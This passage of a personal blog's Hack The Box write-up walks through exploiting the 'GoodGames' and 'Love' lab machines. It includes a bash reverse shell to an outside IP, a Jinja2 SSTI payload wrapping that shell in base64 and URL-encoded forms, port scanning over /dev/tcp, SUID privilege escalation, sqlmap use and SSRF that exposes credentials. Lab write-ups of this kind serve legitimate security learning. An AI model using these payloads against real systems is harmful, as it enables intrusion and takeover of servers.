<p>So we introduce admin@goodgames.htb:superadministrator as credentials and we gain access to a new area of the web: http://internal-administration.goodgames.htb/, so we add the domain to /etc/hosts and continue with the exploration:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126141853.png" text-align="center" />
</div>

<p>Then we are asked again about autentication but if we try again with the credentials admin:superadministrator we gain access:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126141947.png" text-align="center" />
</div>

<p>Exploring manually this new area we find some input fields but one notorius is the ‘General Information’ section on ‘My Profile’ because when we introduce data the outputs turns to be a template:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126142127.png" text-align="center" />
</div>

<p>Wappalyzer tell us that the framework that is being used is Flask, that use the well known template engine Jinja2.</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126142220.png" text-align="center" />
</div>

<p>So we get a request on BurpRepeater in order to Fuzz with some payloads until:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126142431.png" text-align="center" />
</div>

<p>We find that indeed is vulnerable to SSTi. Thus, we are going now achieve a foothoold on the system by using the following bash reverse shell script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.16.9/4444 0&gt;&amp;1
</code></pre></div></div>

<p>However, we can’t send it as raw because it contains some spaces so we have to encoded it with base64:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.16.9/4444 0&gt;&amp;1'</span> | <span class="nb">base64</span>
</code></pre></div></div>

<p>Then, we are going to use the following Jinja2 syntax command (decocde using: echo “codedstring” | base64 | tr -d ‘\n’):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c2VsZi5fVGVtcGxhdGVSZWZlcmVuY2VfX2NvbnRleHQubmFtZXNwYWNlLl9faW5pdF9fLl9fZ2xvYmFsc19fLm9zLnBvcGVuKCc8Q09NTUFORD4nKS5yZWFkKCkK
</code></pre></div></div>

<p>and with the base64 encoded payload this will stand as the following (decode using: echo “codedstring” | base64 | tr -d ‘\n’):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>e3tzZWxmLl9UZW1wbGF0ZVJlZmVyZW5jZV9fY29udGV4dC5uYW1lc3BhY2UuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ3t7c2VsZi5fVGVtcGxhdGVSZWZlcmVuY2VfX2NvbnRleHQubmFtZXNwYWNlLl9faW5pdF9fLl9fZ2xvYmFsc19fLm9zLnBvcGVuKCdlY2hvJHtJRlN9WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4Tmk0NUx6UTBORFFnTUQ0bU1Rbz0ke0lGU318YmFzZTY0JHtJRlN9LWR8YmFzaCcpLnJlYWQoKX19JykucmVhZCgpfX0gCg==
</code></pre></div></div>

<p>We have to note that the command in self is echoing, decoding the payload and then passing it to bash. Instead of an space we put ‘${IFS}’.</p>

<p>Then, as we are going to send this through a HTTP request we have to URL encoded it with the BurpDecoder:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126143609.png" text-align="center" />
</div>

<p>The payload in its totality previous to the send looks like follows:</p>

<pre><code class="language-URL">%7b%7b%73%65%6c%66%2e%5f%54%65%6d%70%6c%61%74%65%52%65%66%65%72%65%6e%63%65%5f%5f%63%6f%6e%74%65%78%74%2e%6e%61%6d%65%73%70%61%63%65%2e%5f%5f%69%6e%69%74%5f%5f%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%2e%6f%73%2e%70%6f%70%65%6e%28%27%65%63%68%6f%24%7b%49%46%53%7d%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%69%34%35%4c%7a%51%30%4e%44%51%67%4d%44%34%6d%4d%51%6f%3d%24%7b%49%46%53%7d%7c%62%61%73%65%36%34%24%7b%49%46%53%7d%2d%64%7c%62%61%73%68%27%29%2e%72%65%61%64%28%29%7d%7d
</code></pre>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126143736.png" text-align="center" />
</div>

<p>And then, we gain a reverse shell:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126143755.png" text-align="center" />
</div>

<p>Briefly enumeration show  er are in a Docker Container:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126144004.png" text-align="center" />
</div>

<p>Further enumeration shows that exists a directory on /home called augustus that is owned y other UIP that root’s:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126144220.png" text-align="center" />
</div>

<p>This is kind of strange since we are in a Docker container that only have the minimun to run an application. This could be a user’s home directory mounted inside the docker container from the main system. This could be verified with the 
mount command:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126144424.png" text-align="center" />
</div>

<p>Indeed, we see that the user directory from the host is mounted with read/write flag enabled. For now this not seems to be useful so we continue to enumerating.</p>

<p>We check the network information:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126144929.png" text-align="center" />
</div>

<p>We see that our net is a private net on 172.19.0.2. Because we are in a docker container, we know that usually the main system will have the 172.19.0.1 attached. We can perform a port scanning without nmap:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>PORT <span class="k">in</span> <span class="o">{</span>0..1000<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"&lt;/dev/tcp/172.19.0.1/</span><span class="nv">$PORT</span><span class="s2"> &amp;&gt;/dev/null"</span> 2&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"port </span><span class="nv">$PORT</span><span class="s2"> is open"</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<p>The scan shows that the 22/tcp port is open so SSH is open:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126145907.png" text-align="center" />
</div>

<p>Then, we try to log to the machine with SSH recycling the ‘superadministrator’ password and we have success:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126150045.png" text-align="center" />
</div>

<p>Then, we can take advantage from the writing perms we have as root on the augustus’s home directory mounted on the Docker container.</p>

<p>First, as augustus we copy the bash binary onto the /home/augustus directory:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126150756.png" text-align="center" />
</div>

<p>Then we exit and as root of the docker container we proceed to change the propierty and the perms of the filw in order to convert it in to a SUID file owned by root:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126150904.png" text-align="center" />
</div>

<p>Then, we log in again on the august ssh session and check the perms files:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126150939.png" text-align="center" />
</div>

<p>Then, we execute the file and we gain a root’s session:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126151000.png" text-align="center" />
</div>

<h3 id="8-love---windows-ssrf-to-an-internal-service-via-file_get_contents-on-php-">8. Love - Windows (SSRF to an internal service via file_get_contents on PHP, ).</h3>

<p>At first, we perform a Nmap scan and see that we have a HTTP/S, SMB, MySQL, and WinRM services on default ports (80, 443, 139, 445, 3309, 5985).</p>

<p>First, we go to explore the web and we face an authentication portal:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221128092921.png" text-align="center" />
</div>

<p>Before try with some defaults credentials we desist and search for an <a href="https://www.exploit-db.com/exploits/49445">exploit</a> but it requires some user son we go ahead and try a SQLi attack with sqlmap. We capture some random request and copy it into a file and use it on SQLmap</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221128093134.png" text-align="center" />
</div>

<p><br /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-r</span> request <span class="nt">-p-</span> <span class="s2">"voter, password"</span> <span class="nt">-batch</span>
</code></pre></div></div>

<p>The output shows that the ‘voter’ parameter is vulnerable:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221128093256.png" text-align="center" />
</div>

<p>We see that the vulnerability is Time-Based and because this, the extraction of information is gonna be slow, so we try to see if other method of extraction is available with ‘–technique=BEUS’ (Explication on machine 3) but we don’t have luck. Although the efforts, we don’t manage the retrieve some useful information.</p>

<p>After trying anonymous enumeration of the other services we re-explore the information available we see that the HTTPS server exposes a domain on the nmap scan at the ssl-cert field:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221128125336.png" text-align="center" />
</div>

<p>We can add the new domain to the /etc/hosts:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.10.10.239 www.love.htb staging.love.htb"</span> <span class="o">&gt;</span> /etc/hosts
</code></pre></div></div>

<p>Visiting it, we found a file scanner:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221128125814.png" text-align="center" />
</div>

<p>This file scanner acts parsing the file and displays the output on the web page:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221128130648.png" text-align="center" />
</div>

<p>Because the code is incorporated in the same html page, it can’t be performed by a Template Engine, we try to perform a reverse shell uploading a php shell because wappalyzer tell us that the page is PHP-based:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221128131151.png" text-align="center" />
</div>

<p>But we don’t have luck either. In other way, this functionality could be vulnerable to a SSRF (Server-Side Request Forgery), we see that the service in port 5000 is unavailable:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221128133218.png" text-align="center" />
</div>

<p>But, maybe allow us to access it internaly by the functionality above:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221128133430.png" text-align="center" />
</div>

<p>The output display admins credentials: admin : @LoveIsInTheAir!!!!</p>


      </article>

      
        <div class="blog-tags">
          <span>Tags:</span>
          
            <a href="/tags#hack">hack</a>
          
        </div>
      

      

      
        <!-- Check if any share-links are active -->




<section id = "social-share-section">
  <span class="sr-only">Share: </span>

  
    <a href="https://twitter.com/intent/tweet?text=Easy&url=http%3A%2F%2Flocalhost%3A4000%2F2022-12-01-Easy%2F"
      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
      <span class="sr-only">Twitter</span>
    </a>
  

  
    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2022-12-01-Easy%2F"
      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
      <span class="sr-only">Facebook</span>
    </a>
  

  
    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2022-12-01-Easy%2F"
      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
      <span class="sr-only">LinkedIn</span>
    </a>
  

  

  

</section>



      

      <ul class="pagination blog-pager">
        
        <li class="page-item previous">
          <a class="page-link" href="/2022-11-17-GitBasics/" data-toggle="tooltip" data-placement="top" title="Git Basics">&larr; Previous Post</a>
        </li>
        
        
        <li class="page-item next">
          <a class="page-link" href="/2023-11-01-1.Linux/" data-toggle="tooltip" data-placement="top" title="Linux">Next Post &rarr;</a>
        </li>
        
      </ul>
      
  
  
  

  


  



    </div>
  </div>
</div>


  <footer>
  <div class="container-md beautiful-jekyll-footer">
    <div class="row">
      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
    <a href="/feed.xml" title="RSS">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">RSS</span>
    </a>
  </li><li class="list-inline-item">
    <a href="mailto:sanmillan.german@gmail.com" title="Email me">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">Email me</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://github.com/Qv1nTv5" title="GitHub">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">GitHub</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://twitter.com/Qvintvs1" title="Twitter">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">Twitter</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://linkedin.com/in/german-sanmillan-68b308229/" title="LinkedIn">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">LinkedIn</span>
   </a>
  </li></ul>

      
      <p class="copyright text-muted">
      
        Qv1nTv5
        &nbsp;&bull;&nbsp;
      
      2024

      

      
      </p>
      <p class="theme-by text-muted">
        Powered by
        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
      </p>
      </div>
    </div>
  </div>
</footer>


  
  
    
  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>


  
    
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>


  
    
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>


  



  
    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
    
      <script src="/assets/js/beautifuljekyll.js"></script>
    
  









</body>
</html>
